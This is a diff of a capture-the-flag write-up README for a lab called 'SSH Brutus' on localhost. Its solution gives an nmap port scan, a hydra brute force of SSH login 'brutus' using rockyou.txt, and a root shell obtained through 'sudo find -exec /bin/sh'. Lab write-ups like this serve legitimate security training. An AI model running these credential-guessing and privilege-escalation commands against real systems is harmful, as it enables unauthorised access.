@@ -1,26 +1,13 @@
-# CTF 1: SSH Brutus
+## Engagement steps
+1. Port Scanning with Nmap and find ssh on 22
+2. Hydra SSH Brute force password using rockyou.txt
+3. Privilege escalation with `sudo find` to root
 
-## Requirements
-- [nmap](https://nmap.org/)
-- [hydra](https://www.kali.org/tools/hydra/)
-- [wordlists](https://www.kali.org/tools/wordlists/) -> rockyou.txt
-
-## About Categorize
-- Brute Force
-- Privilege escalation
-
-## Plan of Engagement
-1. Port Scanning -> 22
-2. SSH Exploit (brute force)
-3. Privilege escalation with sudo find to root
-
-## External Resources
-- [GTFOBins](https://gtfobins.github.io/)
 
 ## Solution
 Nmap port scan:
 ```sh
-sudo nmap -sS -sC -F 127.0.0.1
+sudo nmap -sS -sC -p- 127.0.0.1 -vv
 ```
 
 Crack password:
@@ -29,6 +16,6 @@ hydra -l brutus -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 ```
 
 Privileges escalation:
-```Sh
+```sh
 sudo find . -exec /bin/sh \; -quit
 ```
